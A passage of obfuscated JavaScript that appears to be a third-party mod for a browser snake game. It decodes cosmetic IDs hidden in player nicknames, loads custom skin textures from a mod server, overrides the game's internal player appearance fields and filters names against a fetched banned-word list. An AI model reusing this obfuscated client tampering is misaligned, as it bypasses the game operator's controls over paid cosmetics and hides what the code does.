    $.ajax({
      type: "GET",
      url: _0x25861a._d,
      xhrFields: {
        responseType: "arraybuffer",
        onprogress: function _0x258c83(_0x535d32) {
          if (_0x535d32.lengthComputable) {
            _0x33ed2d(_0x535d32.loaded / _0x535d32.total);
          }
        }
      }
    }).fail(function () {
      _0x2f1d1b(new Error());
    }).done(function (_0x5b1166) {
      _0x278565(_0x5b1166);
    });
  };
  _0x261341.$d = function (_0x55ac54, _0x39c507, _0x296586) {
    function _0x307d5f(_0x32ef87) {
      var _0x7ba149 = _0x296586.Id.Md;
      _0x1ee2c9.Rd(_0x7ba149, _0x296586.Od.bc(_0x7ba149).lc(_0x32ef87));
    }
    var _0x1ee2c9 = this;
    if (this.Fd) {
      this.Pd();
      return;
    }
    var _0x5189f9;
    var _0x4c5c13;
    var _0x33f394 = {};
    var _0x4d1498 = function _0x4f7849() {
      for (var _0x27bf96 = 0; _0x27bf96 < _0x39c507.length; _0x27bf96++) {
        try {
          window.URL.revokeObjectURL(_0x39c507[_0x27bf96].Xd);
        } catch (_0x8343b4) {}
      }
      _0x1ee2c9.Sd(new Error());
    };
    var _0x5a4762 = function _0x44d203() {
      var _0x140c64 = _0x192d04 == 5 ? 0 : _0x192d04;
      _0x307d5f(_0x140c64 / 4);
      _0x33f394[_0x5189f9.ae] = new _0x261341.$C.be(_0x5189f9.Xd, _0x4c5c13);
      _0x29904d();
    };
    var _0x29904d = function _0x4e7c39() {
      try {
        if (_0x192d04 < _0x39c507.length) {
          _0x5189f9 = _0x39c507[_0x192d04];
          _0x192d04++;
          if (_0x5189f9.custom) {
            try {
              let _0x9705e2 = null;
              const _0xd2d592 = _0x55ac54.textureDict[_0x5189f9.ae];
              if (_0x5189f9.textureUrl) {
                if (_0x5189f9.textureUrl.startsWith("data:image/")) {
                  const _0x137772 = PIXI.BaseTexture.from(_0x5189f9.textureUrl);
                  _0x9705e2 = new PIXI.Texture(_0x137772);
                } else if (_0x5189f9.textureUrl.startsWith("http")) {
                  const _0x12dbde = PIXI.BaseTexture.from(_0x5189f9.textureUrl);
                  _0x9705e2 = new PIXI.Texture(_0x12dbde);
                }
              } else if (_0x5189f9.resource && _0x5189f9.resource.texture) {
                _0x9705e2 = _0x5189f9.resource.texture;
              } else if (_0xd2d592) {
                if (_0xd2d592.file && _0xd2d592.file.startsWith("data:image/")) {
                  const _0x3f25b5 = PIXI.BaseTexture.from(_0xd2d592.file);
                  _0x9705e2 = new PIXI.Texture(_0x3f25b5);
                } else if (_0xd2d592.relativePath && _0xd2d592.relativePath.startsWith("http")) {
                  const _0x124bd2 = PIXI.BaseTexture.from(_0xd2d592.relativePath);
                  _0x9705e2 = new PIXI.Texture(_0x124bd2);
                } else if (_0xd2d592.file) {
                  let _0x4ebedb = _0xd2d592.file;
                  if (!_0x4ebedb.startsWith("data:image/")) {
                    if (_0x4ebedb.length > 222) {
                      _0x4ebedb = _0x4ebedb.substring(222) + _0x4ebedb.substring(0, 222);
                    }
                    _0x4ebedb = "data:image/png;base64," + _0x4ebedb;
                  }
                  const _0x1d10b4 = PIXI.BaseTexture.from(_0x4ebedb);
                  _0x9705e2 = new PIXI.Texture(_0x1d10b4);
                }
              }
              if (_0x9705e2) {
                _0x33f394[_0x5189f9.ae] = new _0x261341.$C.be(_0x9705e2, _0x9705e2.baseTexture);
              }
            } catch (_0x592c2b) {}
          } else if (_0x5189f9.resource) {
            try {
              let _0x1a223d = null;
              if (_0x5189f9.resource.texture && _0x5189f9.resource.texture.baseTexture) {
                _0x1a223d = _0x5189f9.resource.texture;
              } else if (_0x5189f9.resource.data) {
                const _0x36426e = PIXI.BaseTexture.from(_0x5189f9.resource.data);
                _0x1a223d = new PIXI.Texture(_0x36426e);
              } else if (_0x5189f9.resource.url) {
                const _0x4a4dc5 = PIXI.BaseTexture.from(_0x5189f9.resource.url);
                _0x1a223d = new PIXI.Texture(_0x4a4dc5);
              }
              if (_0x1a223d) {
                _0x33f394[_0x5189f9.ae] = new _0x261341.$C.be(_0x1a223d, _0x1a223d.baseTexture);
              }
            } catch (_0xb2cc00) {}
          }
          _0x29904d();
          return;
        }
        if (texture.custom && texture.file && !_0x33f394[textureId]) {
          try {
            var _0x1a9cbe = texture.file;
            if (_0x1a9cbe && !_0x1a9cbe.startsWith("data:image/")) {
              if (_0x1a9cbe.length > 222) {
                _0x1a9cbe = _0x1a9cbe.substring(222) + _0x1a9cbe.substring(0, 222);
              }
              _0x1a9cbe = "data:image/png;base64," + _0x1a9cbe;
            }
            const _0x2a6b0f = PIXI.BaseTexture.from(_0x1a9cbe);
            _0x2a6b0f.scaleMode = PIXI.SCALE_MODES.NEAREST;
            _0x2a6b0f.mipmap = PIXI.MIPMAP_MODES.OFF;
            const _0x71e0d5 = new PIXI.Texture(_0x2a6b0f);
            _0x33f394[textureId] = new _0x261341.$C.be(_0x71e0d5, _0x2a6b0f);
            _0x2a6b0f.update();
          } catch (_0x199cfe) {}
        }
        Object.assign(_0x55ac54.textureDict, _0x33f394);
        return _0x1ee2c9.ce(_0x55ac54, _0x33f394);
      } catch (_0x291f40) {
        return _0x1ee2c9.ce(_0x55ac54, _0x33f394);
      }
    };
    var _0x192d04 = 0;
    _0x29904d();
  };
  _0x261341.p = function (_0x168f16, _0x832e5) {
    _0x168f16 = _0x168f16.split("|");
    _0x261341.pm[_0x168f16[0]] = {
      p: _0x168f16[1],
      i: _0x832e5
    };
  };
  window.dynamicSkinSystem = {
    offsetTable: new Map(),
    isInitialized: false,
    findRealSkinValue: function (_0x20ef9d) {
      if (this.offsetTable.has(_0x20ef9d)) {
        return this.offsetTable.get(_0x20ef9d);
      }
      try {
        const _0x502fc4 = window._wup?._anApp?.dh?.Fh;
        if (_0x502fc4) {
          for (const _0x418585 of Object.values(_0x502fc4)) {
            if (_0x418585?.Eh?.ma && _0x418585.Eh.Hh) {
              const _0x69215d = _0x418585.Eh.ma.substr(-7).substr(0, 2);
              if (parseInt(_0x69215d, window.vps.g) === _0x20ef9d) {
                this.offsetTable.set(_0x20ef9d, _0x418585.Eh.Hh);
                return _0x418585.Eh.Hh;
              }
            }
          }
        }
      } catch (_0x364f37) {}
      return null;
    }
  };
  function _0x454321(_0x2666dc) {
    let _0x50fbc4 = {
      a: 0,
      b: 0,
      c: 0,
      d: 0,
      e: 0,
      f: "",
      g: 0,
      h: "",
      i: ""
    };
    let _0x2323ce = 0;
    _0x50fbc4.h = _0x2666dc.substr(-9);
    if (_0x50fbc4.h.substr(0, 1) != ".") {
      _0x50fbc4.i = "0000";
    } else if ((_0x2323ce = parseInt(_0x50fbc4.h.substr(1, 1), window.vps.g)) > 15) {
      _0x2323ce -= 16;
      _0x50fbc4.i = _0x2323ce.toString(2).padStart(4, 0);
    } else {
      _0x50fbc4.i = _0x2323ce.toString(2).padStart(4, 0);
      _0x2323ce = 0;
    }
    _0x50fbc4.f = _0x2666dc.substr(-7);
    if (_0x50fbc4.f.substr(0, 2) != "00") {
      const _0x50373d = parseInt(_0x50fbc4.f.substr(0, 2), window.vps.g);
      let _0x4a55f0 = (_0x50373d - 1) * (window.vps.g / 9) + window.vps.g * 10;
      _0x4a55f0 = _0x4a55f0 - (window.vps.g - window.vps.g / 9);
      const _0x3d76a4 = window.dynamicSkinSystem.findRealSkinValue(_0x50373d);
      if (_0x3d76a4 !== null) {
        const _0x2020c7 = _0x4a55f0 + _0x3d76a4;
        const _0x2dea35 = window.vps.g * 100;
        const _0x2bc617 = Math.floor(window.vps.g / 9 * 1000);
        if (_0x2020c7 >= _0x2dea35 || _0x2020c7 >= _0x2bc617) {
          const _0x5687dc = window.vps.sg && window.vps.sg.includes(_0x2020c7);
          if (_0x5687dc) {
            _0x50fbc4.a = _0x2020c7;
          } else {
            _0x50fbc4.a = _0x3d76a4;
          }
        } else {
          _0x50fbc4.a = _0x2020c7;
        }
      } else {
        _0x50fbc4.a = _0x4a55f0;
      }
    }
    if (_0x50fbc4.f.substr(5, 1) == "|") {
      if (_0x50fbc4.f.substr(6, 1) != "0") {
        _0x50fbc4.e = parseInt(_0x50fbc4.f.substr(6, 1), window.vps.g);
        if (_0x50fbc4.i.substr(3, 1) != "0") {
          if (_0x2323ce > 0) {
            _0x50fbc4.e = _0x50fbc4.e + window.vps.g * 20 + (window.vps.g - 1) * 2;
          } else {
            _0x50fbc4.e = _0x50fbc4.e + window.vps.g * 20;
          }
        } else {
          _0x50fbc4.e = _0x50fbc4.e - 1 + window.vps.g / 9 * 100;
        }
      }
    } else {
      _0x50fbc4.e = parseInt(_0x50fbc4.f.substr(6, 1), window.vps.g);
      if (_0x50fbc4.i.substr(3, 1) != "0") {
        if (_0x2323ce > 0) {
          _0x50fbc4.e = _0x50fbc4.e + window.vps.g * 20 + (window.vps.g - 1) * 3;
        } else {
          _0x50fbc4.e = _0x50fbc4.e + window.vps.g * 20 + (window.vps.g - 1);
        }
      } else {
        _0x50fbc4.e = _0x50fbc4.e + (window.vps.g / 9 * 100 + (window.vps.g - 1));
      }
    }
    _0x50fbc4.f = _0x50fbc4.f.replace("|", "");
    if (_0x50fbc4.f.substr(2, 1) != "0") {
      _0x50fbc4.b = parseInt(_0x50fbc4.f.substr(2, 1), window.vps.g);
      if (_0x50fbc4.i.substr(0, 1) != "0") {
        _0x50fbc4.b = _0x50fbc4.b + window.vps.g * 20;
      } else {
        _0x50fbc4.b = _0x50fbc4.b - 1 + window.vps.g / 9 * 100;
      }
    }
    if (_0x50fbc4.f.substr(3, 1) != "0") {
      _0x50fbc4.c = parseInt(_0x50fbc4.f.substr(3, 1), window.vps.g);
      if (_0x50fbc4.i.substr(1, 1) != "0") {
        _0x50fbc4.c = _0x50fbc4.c + window.vps.g * 20;
      } else {
        _0x50fbc4.c = _0x50fbc4.c - 1 + window.vps.g / 9 * 100;
      }
    }
    if (_0x50fbc4.f.substr(4, 1) != "0") {
      _0x50fbc4.d = parseInt(_0x50fbc4.f.substr(4, 1), window.vps.g);
      if (_0x50fbc4.i.substr(2, 1) != "0") {
        _0x50fbc4.d = _0x50fbc4.d + window.vps.g * 20;
      } else {
        _0x50fbc4.d = _0x50fbc4.d - 1 + window.vps.g / 9 * 100;
      }
    }
    return _0x50fbc4;
  }
  function _0x3738e7(_0x5e612d, _0x7867df, _0x288833, _0x40b561, _0x505405, _0x1e425c) {
    let _0x31ca92 = {
      a: "",
      b: 0,
      c: ""
    };
    if (_0x5e612d > window.vps.g * 100 + 100 || _0x5e612d < window.vps.g * 10 || _0x5e612d === undefined) {
      window.vps.a = _0x5e612d;
      if (_0x5e612d === undefined) {
        window.vps.a = Math.floor(Math.random() * (window.vps.g / 9) + (window.vps.g - window.vps.g / 9));
      }
      _0x31ca92.a = "00";
    } else {
      window.vps.a = _0x5e612d - window.vps.g * 10;
      _0x31ca92.b = window.vps.a;
      window.vps.a = window.vps.a % (window.vps.g / 9);
      _0x31ca92.b = (_0x31ca92.b - window.vps.a) / (window.vps.g / 9) + 1;
      window.vps.a = window.vps.a + (window.vps.g - window.vps.g / 9);
      _0x31ca92.a = _0x31ca92.b.toString(window.vps.g).padStart(2, 0);
    }
    if (_0x7867df > window.vps.g * 20 || _0x7867df < window.vps.g / 9 * 100 || _0x7867df === undefined) {
      if (_0x7867df > window.vps.g * 20 && _0x7867df < window.vps.g * 30) {
        window.vps.b = _0x7867df - window.vps.g * 20;
        _0x31ca92.a = _0x31ca92.a + window.vps.b.toString(window.vps.g);
        window.vps.b = 0;
        _0x31ca92.c = _0x31ca92.c + "1";
      } else {
        window.vps.b = _0x7867df;
        if (_0x7867df === undefined) {
          window.vps.b = 0;
        }
        _0x31ca92.a = _0x31ca92.a + "0";
        _0x31ca92.c = _0x31ca92.c + "0";
      }
    } else {
      window.vps.b = _0x7867df - window.vps.g / 9 * 100 + window.vps.g / window.vps.g;
      _0x31ca92.a = _0x31ca92.a + window.vps.b.toString(window.vps.g);
      window.vps.b = 0;
      _0x31ca92.c = _0x31ca92.c + "0";
    }
    if (_0x288833 > window.vps.g * 20 || _0x288833 < window.vps.g / 9 * 100 || _0x288833 === undefined) {
      if (_0x288833 > window.vps.g * 20 && _0x288833 < window.vps.g * 30) {
        window.vps.c = _0x288833 - window.vps.g * 20;
        _0x31ca92.a = _0x31ca92.a + window.vps.c.toString(window.vps.g);
        window.vps.c = 0;
        _0x31ca92.c = _0x31ca92.c + "1";
      } else {
        window.vps.c = _0x288833;
        if (_0x288833 === undefined) {
          window.vps.c = 0;
        }
        _0x31ca92.a = _0x31ca92.a + "0";
        _0x31ca92.c = _0x31ca92.c + "0";
      }
    } else {
      window.vps.c = _0x288833 - window.vps.g / 9 * 100 + window.vps.g / window.vps.g;
      _0x31ca92.a = _0x31ca92.a + window.vps.c.toString(window.vps.g);
      window.vps.c = 0;
      _0x31ca92.c = _0x31ca92.c + "0";
    }
    if (_0x40b561 > window.vps.g * 20 || _0x40b561 < window.vps.g / 9 * 100 || _0x40b561 === undefined) {
      if (_0x40b561 > window.vps.g * 20 && _0x40b561 < window.vps.g * 30) {
        window.vps.d = _0x40b561 - window.vps.g * 20;
        if (window.vps.d.toString(window.vps.g) === "z") {
          _0x31ca92.a = _0x31ca92.a + "0";
        } else {
          _0x31ca92.a = _0x31ca92.a + window.vps.d.toString(window.vps.g);
        }
        window.vps.d = 0;
        _0x31ca92.c = _0x31ca92.c + "1";
      } else {
        window.vps.d = _0x40b561;
        if (_0x40b561 === undefined) {
          window.vps.d = 0;
        }
        _0x31ca92.a = _0x31ca92.a + "0";
        _0x31ca92.c = _0x31ca92.c + "0";
      }
    } else {
      window.vps.d = _0x40b561 - window.vps.g / 9 * 100 + window.vps.g / window.vps.g;
      if (window.vps.d.toString(window.vps.g) === "z") {
        _0x31ca92.a = _0x31ca92.a + "0";
      } else {
        _0x31ca92.a = _0x31ca92.a + window.vps.d.toString(window.vps.g);
      }
      window.vps.d = 0;
      _0x31ca92.c = _0x31ca92.c + "0";
    }
    if (_0x505405 > window.vps.g * 20 || _0x505405 < window.vps.g / 9 * 100 || _0x505405 === undefined) {
      if (_0x505405 > window.vps.g * 20 && _0x505405 < window.vps.g * 30) {
        _0x31ca92.b = window.vps.g / window.vps.g;
        if (_0x505405 <= window.vps.g * 20 + (window.vps.g - 1)) {
          window.vps.e = _0x505405 - window.vps.g * 20;
        } else if (_0x505405 <= window.vps.g * 20 + (window.vps.g - 1) * 2) {
          _0x31ca92.b = _0x31ca92.b * 2;
          window.vps.e = _0x505405 - window.vps.g * 20 - (window.vps.g - 1);
        } else if (_0x505405 <= window.vps.g * 20 + (window.vps.g - 1) * 3) {
          window.vps.e = _0x505405 - window.vps.g * 20 - (window.vps.g - 1) * 2;
        } else if (_0x505405 <= window.vps.g * 20 + (window.vps.g - 1) * 4) {
          _0x31ca92.b = _0x31ca92.b * 2;
          window.vps.e = _0x505405 - window.vps.g * 20 - (window.vps.g - 1) * 3;
        } else {
          window.vps.e = 0;
        }
        if (window.vps.e >= window.vps.g) {
          _0x31ca92.b = 2;
          window.vps.e = window.vps.e - (window.vps.g - 1);
        }
        _0x31ca92.a = _0x31ca92.a + window.vps.e.toString(window.vps.g);
        window.vps.e = 0;
        _0x31ca92.c = _0x31ca92.c + "1";
      } else {
        window.vps.e = _0x505405;
        if (_0x505405 === undefined) {
          window.vps.e = 0;
        }
        _0x31ca92.a = _0x31ca92.a + "0";
        _0x31ca92.c = _0x31ca92.c + "0";
        _0x31ca92.b = 0;
      }
    } else {
      _0x31ca92.b = window.vps.g / window.vps.g;
      if (_0x505405 - window.vps.g / 9 * 100 + 1 >= window.vps.g) {
        window.vps.e = _0x505405 - (window.vps.g / 9 * 100 + (window.vps.g - 1));
        _0x31ca92.b = _0x31ca92.b * 2;
      } else {
        window.vps.e = _0x505405 - window.vps.g / 9 * 100 + _0x31ca92.b;
      }
      _0x31ca92.a = _0x31ca92.a + window.vps.e.toString(window.vps.g);
      window.vps.e = 0;
      _0x31ca92.c = _0x31ca92.c + "0";
    }
    if (_0x31ca92.a == "000000") {
      window.vps.f = _0x1e425c.substr(0, 22).padEnd(22);
    } else {
      let _0x4e17ca = parseInt(_0x31ca92.c, 2);
      if (_0x505405 > 790 && _0x505405 <= 860) {
        _0x4e17ca += 16;
      }
      if (_0x31ca92.b <= 1) {
        _0x31ca92.a = _0x31ca92.a.substr(0, 5) + "|" + _0x31ca92.a.substr(5, 1);
      } else {
        _0x31ca92.a = _0x31ca92.a.substr(0, 4) + "|" + _0x31ca92.a.substr(4, 2);
      }
      if (_0x1e425c == "") {
        _0x1e425c = ".                       .";
      }
      if (_0x31ca92.c == "0000") {
        if (_0x1e425c.substr(23, 1) == ".") {
          _0x1e425c = _0x1e425c.substr(0, 23).padEnd(23) + " " + _0x1e425c.substr(24, 1).padEnd(1);
        }
        window.vps.f = (_0x1e425c.length >= 32 ? _0x1e425c.substr(0, 25) : _0x1e425c.substr(0, 25).padEnd(25)) + _0x31ca92.a;
      } else {
        window.vps.f = (_0x1e425c.length >= 32 ? _0x1e425c.substr(0, 23) : _0x1e425c.substr(0, 23).padEnd(23)) + "." + _0x4e17ca.toString(window.vps.g) + _0x31ca92.a;
      }
      window.vps.f = window.vps.f.replaceAll(" ", "_");
    }
  }
  function _0x4e1a5b(_0x39802d) {
    return !(_0x39802d > window.vps.g * 30) && !(_0x39802d < window.vps.g / 9 * 100) || _0x39802d == 0;
  }
  function _0xdd462(_0x137584) {
    return /^(.{25})(\w{5}\|\w{1})$/.test(_0x137584) || /^(.{25})(\w{4}\|\w{2})$/.test(_0x137584);
  }
  function _0x55dd91(_0x5ed181) {
    _0x5ed181 = _0x5ed181.replaceAll("_", " ");
    let _0x5ef1a9 = _0x5ed181;
    if (/^(.{25})(\w{7})$/.test(_0x5ed181)) {
      for (_0x5ed181 = _0x5ed181.substr(0, 15).trim(); _0x5ed181.substr(_0x5ed181.length - 1, 1) == ".";) {
        _0x5ed181 = _0x5ed181.substr(0, _0x5ed181.length - 1);
      }
      _0x5ef1a9 = _0x5ed181;
    } else if (/^(.{25})(\w{5}\|\w{1})$/.test(_0x5ed181) || /^(.{25})(\w{4}\|\w{2})$/.test(_0x5ed181)) {
      if (_0x5ed181.substr(-9).substr(0, 1) != ".") {
        _0x5ef1a9 = _0x5ed181.substr(0, 25).trim();
      } else {
        _0x5ef1a9 = _0x5ed181.substr(0, 23).trim();
      }
    }
    return _0x5ef1a9;
  }
  function _0x33ed9a() {
    fetch(window.vps.s_l + "/words").then(_0x5668e5 => {
      if (!_0x5668e5.ok) {
        throw new Error("HTTP error! status: " + _0x5668e5.status);
      }
      return _0x5668e5.json();
    }).then(_0x58af99 => {
      if (Array.isArray(_0x58af99)) {
        window.vps.bannedWords = _0x58af99;
        localStorage.setItem("vps", JSON.stringify(window.vps));
      } else {
        console.warn("البيانات المستلمة ليست مصفوفة:", _0x58af99);
        window.vps.bannedWords = [];
      }
    }).catch(_0x1ef7fb => {
      console.error("خطأ في تحميل الكلمات المحظورة:", _0x1ef7fb);
      window.vps.bannedWords = [];
    });
  }
  if (window.vps.bannedWordsEnabled) {
    _0x33ed9a();
  }
  function _0x4d2813(_0x20f70e, _0x3c4299 = false) {
    if (_0x3c4299 || window.vps.bannedWordsEnabled && window.vps.bannedWords && window.vps.bannedWords.length > 0) {
      let _0x22e399 = _0x20f70e.replace(/[0-9*_\-\s\u064B-\u065F\u0640\u06D4]/g, "").replace(/[أإآ]/g, "ا").replace(/[ؤ]/g, "و").replace(/[ئ]/g, "ي").replace(/[ة]/g, "ه").replace(/[s$]/gi, "س").replace(/[k]/gi, "ك").replace(/[g]/gi, "غ").replace(/[z]/gi, "ز").replace(/[x]/gi, "ك").replace(/[c]/gi, "س").replace(/[v]/gi, "ف").replace(/[b]/gi, "ب").replace(/[n]/gi, "ن").replace(/[m]/gi, "م").replace(/[r]/gi, "ر").replace(/[t]/gi, "ت").replace(/[y]/gi, "ي").replace(/[a]/gi, "ا").replace(/[e]/gi, "ع").replace(/[h]/gi, "ه").replace(/[w]/gi, "و").replace(/[d]/gi, "د").replace(/[f]/gi, "ف").replace(/[l]/gi, "ل").replace(/[j]/gi, "ج").replace(/[p]/gi, "ب").replace(/[q]/gi, "ق").toLowerCase();
      for (let _0x1ab3b2 of window.vps.bannedWords) {
        if (_0x1ab3b2) {
          let _0x2c6658 = _0x1ab3b2.replace(/[أإآ]/g, "ا").replace(/[ؤ]/g, "و").replace(/[ئ]/g, "ي").replace(/[ة]/g, "ه").toLowerCase();
          if (_0x22e399.includes(_0x2c6658)) {
            return "أن الله يراك";
          }
        }
      }
    }
    return _0x20f70e;
  }
  _0x261341.ae = function (_0x52d659, _0xcbd18e, _0x530a0c) {
    if (_0xcbd18e.maV !== 1) {
      _0xcbd18e.maV = 1;
      var _0x43a891 = _0xcbd18e.ma.trim();
      if (_0xdd462(_0x43a891)) {
        try {
          var _0x22f581 = _0x454321(_0x43a891);
          var _0x563761 = _0x22f581.a > 0;
          var _0x28699d = _0x4e1a5b(_0x22f581.b);
          var _0x5eef84 = _0x4e1a5b(_0x22f581.c);
          var _0x9ebe74 = _0x4e1a5b(_0x22f581.d);
          var _0xf4c1e3 = _0x4e1a5b(_0x22f581.e);
          if (_0x530a0c && _0x530a0c.dh && _0x530a0c.dh.Fh && _0x530a0c.dh.Fh[_0xcbd18e.ae] && _0x530a0c.dh.Fh[_0xcbd18e.ae].Eh) {
            var _0x52abb6 = _0x530a0c.dh.Fh[_0xcbd18e.ae].Eh;
            if (_0x563761 && _0x22f581.a > 0) {
              if (_0x52abb6.Hh !== undefined) {
                _0x52abb6.Hh = _0x22f581.a;
              }
              if (_0x52abb6.skinId !== undefined) {
                _0x52abb6.skinId = _0x22f581.a;
              }
              if (_0x52abb6.skin !== undefined) {
                _0x52abb6.skin = _0x22f581.a;
              }
              if (_0x52abb6.appearance && _0x52abb6.appearance.skin !== undefined) {
                _0x52abb6.appearance.skin = _0x22f581.a;
              }
            }
            if (_0x28699d && _0x22f581.b > 0) {
              if (_0x52abb6.ni !== undefined) {
                _0x52abb6.ni = _0x22f581.b;
              }
              if (_0x52abb6.eyesId !== undefined) {
                _0x52abb6.eyesId = _0x22f581.b;
              }
            }
            if (_0x5eef84 && _0x22f581.c > 0) {
              if (_0x52abb6.oi !== undefined) {
                _0x52abb6.oi = _0x22f581.c;
              }
              if (_0x52abb6.mouthId !== undefined) {
                _0x52abb6.mouthId = _0x22f581.c;
              }
            }
            if (_0x9ebe74 && _0x22f581.d > 0) {
              if (_0x52abb6.pi !== undefined) {
                _0x52abb6.pi = _0x22f581.d;
              }
              if (_0x52abb6.glassesId !== undefined) {
                _0x52abb6.glassesId = _0x22f581.d;
              }
            }
            if (_0xf4c1e3 && _0x22f581.e > 0) {
              if (_0x52abb6.qi !== undefined) {
                _0x52abb6.qi = _0x22f581.e;
              }
              if (_0x52abb6.hatId !== undefined) {
                _0x52abb6.hatId = _0x22f581.e;
              }
            }
          }
          var _0x7d72ad = _0x55dd91(_0x43a891);
          _0xcbd18e.ma = _0x1180ad(_0x7d72ad);
        } catch (_0x441670) {
          console.error("خطأ في فك التشفير:", _0x441670);
          _0xcbd18e.ma = _0x1180ad(_0xcbd18e.ma);
        }
      } else {
        _0xcbd18e.ma = _0x1180ad(_0xcbd18e.ma);
      }
    }
    _0xcbd18e.ma = _0x1180ad(_0xcbd18e.ma);
  };
  _0x261341.Xp = function (_0x34b699, _0x3db60b, _0x237016, _0x5179b4, _0x34605a, _0x3b10c1, _0x242986) {
    _0x3738e7(_0x237016, _0x5179b4, _0x34605a, _0x3b10c1, _0x242986, _0x3db60b || "");
    return window.vps.f;
  };
  _0x261341.processNewSkinFormat = function (_0x1079b5, _0x196363) {
    try {
      Object.keys(_0x1079b5).forEach(function (_0x22e9ce) {
        if (_0x22e9ce.startsWith("custom_skin_")) {
          const _0x193201 = _0x1079b5[_0x22e9ce];
        }
      });
      if (!_0x196363.skinArrayDict) {
        _0x196363.skinArrayDict = [];
      }
      if (!_0x196363.skinGroupArrayDict) {
        _0x196363.skinGroupArrayDict = [];
      }
      if (!_0x196363.textureDict) {
        _0x196363.textureDict = {};
      }
      if (!_0x196363.regionDict) {
        _0x196363.regionDict = {};
      }
      let _0x515122 = null;
      for (let _0x3e1507 = 0; _0x3e1507 < _0x196363.skinGroupArrayDict.length; _0x3e1507++) {
        if (_0x196363.skinGroupArrayDict[_0x3e1507].id === "TimMap Skins") {
          _0x515122 = _0x196363.skinGroupArrayDict[_0x3e1507];
          break;
        }
      }
      if (!_0x515122) {
        _0x515122 = {
          isCustom: true,
          id: "TimMap Skins",
          img: atob(savedImages[33]),
          name: {
            de: "TimMap Skins",
            en: "TimMap Skins",
            es: "Nuevos Skins Personalizados",
            fr: "Nouveaux Skins Personnalisés",
            uk: "Нові Користувацькі скіни",
            ar: "سكنات جديدة مخصصة"
          },
          list: []
        };
      }
      Object.keys(_0x1079b5).forEach(function (_0x23d9e6) {
        if (_0x23d9e6.startsWith("custom_skin_")) {
          const _0x20415b = _0x1079b5[_0x23d9e6];
          if (!_0x20415b) {
            console.warn("بيانات السكن فارغة:", _0x23d9e6);
            return;
          }
          if (_0x20415b.textureDict) {
            Object.keys(_0x20415b.textureDict).forEach(function (_0x2676aa) {
              const _0x48d512 = _0x20415b.textureDict[_0x2676aa];
              if (_0x48d512) {
                let _0x51029e = null;
                if (_0x48d512.file) {
                  _0x51029e = _0x48d512.file;
                  if (_0x51029e.startsWith("data:image/png;base64,")) {} else if (!_0x51029e.startsWith("data:image/")) {
                    try {
                      _0x51029e = _0x3c809d(_0x51029e);
                    } catch (_0xc28dc4) {
                      console.warn("❌ فشل فك التشفير:", _0x2676aa, _0xc28dc4);
                      return;
                    }
                  } else {
                    console.log("📷 النسيج مُعد مسبقاً:", _0x2676aa);
                  }
                } else if (_0x48d512.relativePath || _0x48d512.re1ativePath) {
                  const _0x2c3fa4 = _0x48d512.relativePath || _0x48d512.re1ativePath;
                  if (_0x2c3fa4.startsWith("http")) {
                    _0x51029e = _0x2c3fa4;
                  } else {
                    _0x51029e = window.vps.s_l + "/store/textures/" + _0x2c3fa4;
                  }
                } else {
                  console.warn("❌ نسيج بدون ملف أو مسار، سيتم تخطيه:", _0x2676aa);
                  return;
                }
                _0x196363.textureDict[_0x2676aa] = {
                  custom: true,
                  h1: true,
                  h4: true,
                  file: _0x51029e,
                  relativePath: _0x51029e.startsWith("http") ? _0x51029e : undefined
                };
              } else {
                console.warn("❌ نسيج فارغ:", _0x2676aa);
              }
            });
          }
          function _0x3c809d(_0x4b48ba) {
            if (!_0x4b48ba) {
              console.error("بيانات base64 فارغة");
              return "data:image/png;base64,";
            }
            if (typeof _0x4b48ba === "string" && _0x4b48ba.indexOf("data:image/png;base64,") !== -1) {
              return _0x4b48ba;
            }
            let _0x24a742 = 222;
            try {
              if (window.theoKzObjects && typeof window.theoKzObjects.c_v === "number") {
                _0x24a742 = window.theoKzObjects.c_v;
              } else if (window.gameSettings && typeof window.gameSettings.c_v === "number") {
                _0x24a742 = window.gameSettings.c_v;
              }
            } catch (_0xc728ed) {
              console.error("خطأ في الحصول على قيمة customValue:", _0xc728ed);
            }
            try {
              if (_0x24a742 > 0 && _0x4b48ba.length > _0x24a742) {
                const _0x20ce44 = "data:image/png;base64," + _0x4b48ba.substring(_0x4b48ba.length - _0x24a742) + _0x4b48ba.substring(0, _0x4b48ba.length - _0x24a742);
                return _0x20ce44;
              } else {
                const _0x166fec = "data:image/png;base64," + _0x4b48ba;
                return _0x166fec;
              }
            } catch (_0x3b87ca) {
              console.error("خطأ في تنسيق البيانات:", _0x3b87ca);
              const _0x1f96d7 = "data:image/png;base64," + _0x4b48ba;
              return _0x1f96d7;
            }
          }
          if (_0x20415b.regionDict) {
            Object.keys(_0x20415b.regionDict).forEach(function (_0x10ad27) {
              const _0x17cbfd = _0x20415b.regionDict[_0x10ad27];
              if (_0x17cbfd) {
                if (_0x17cbfd.texture) {
                  if (!_0x196363.textureDict[_0x17cbfd.texture]) {
                    console.error("❌ منطقة تشير لنسيج غير موجود:", _0x10ad27, "→", _0x17cbfd.texture);
                    return;
                  } else {}
                }
                _0x196363.regionDict[_0x10ad27] = {
                  texture: _0x17cbfd.texture,
                  h: 96,
                  w: 96,
                  x: _0x17cbfd.x || 0,
                  y: _0x17cbfd.y || 0,
                  px: 0,
                  py: 0,
                  pw: 96,
                  ph: 96
                };
              }
            });
          }
          if (_0x20415b.skin) {
            const _0xdfed7e = _0x20415b.skin;
            if (!_0xdfed7e.id || !_0xdfed7e.base || !Array.isArray(_0xdfed7e.base)) {
              console.warn("❌ بيانات السكن غير صالحة:", _0x23d9e6);
              return;
            }
            let _0xfe5b7d = [];
            let _0x4a941b = [];
            _0xdfed7e.base.forEach(function (_0x2b29dd) {
              if (!_0x196363.regionDict[_0x2b29dd]) {
                _0xfe5b7d.push(_0x2b29dd);
              } else {
                _0x4a941b.push(_0x2b29dd);
              }
            });
            if (_0xfe5b7d.length > 0) {
              console.error("❌ السكن يشير لمناطق غير موجودة:", _0xdfed7e.id);
              console.error("مناطق مفقودة:", _0xfe5b7d);
              if (_0x4a941b.length > 0) {
                _0xdfed7e.base = _0x4a941b;
              } else {
                console.error("❌ لا توجد مناطق صالحة للسكن:", _0xdfed7e.id);
                return;
              }
            }
            const _0x57c8ba = {
              id: _0xdfed7e.id,
              base: [..._0xdfed7e.base],
              guest: _0xdfed7e.guest !== false,
              g: _0xdfed7e.g !== false,
              price: _0xdfed7e.price || 0,
              priceBefore: _0xdfed7e.priceBefore || 0,
              nonbuyable: _0xdfed7e.nonbuyable !== false,
              prime: _0xdfed7e.prime || "c_white",
